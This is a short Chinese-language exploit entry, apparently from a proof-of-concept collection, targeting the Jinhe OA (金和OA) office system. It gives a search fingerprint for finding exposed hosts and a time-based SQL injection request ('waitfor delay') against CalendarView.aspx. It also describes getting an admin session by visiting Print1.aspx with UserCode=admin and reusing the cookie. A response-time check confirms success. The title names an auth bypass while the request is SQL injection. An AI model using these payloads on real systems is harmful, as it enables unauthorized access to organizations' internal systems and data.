# 金和OAPrint1.aspx存在权限绕过漏洞

金和OA ｜ 认证/授权绕过 ｜ —
- **指纹**：`app="金和网络-金和OA"`
- **请求**：`GET /c6/Jhsoft.Web.Calendar/CalendarView.aspx?CalendarId=1'waitfor delay '0:0:4'-- HTTP/1.1`

**Payload**
```
通过先访问 /c6/Jhsoft.Web.calendar/public/Print1.aspx/?UserCode=admin 来获取session
再携带session的cookie进行利用即可成功利用
Host: jhsoft.mrxn.net
Cookie: ASP.NET_SessionId=xxxxxx
```
- **响应特征**：200 响应时间>=4s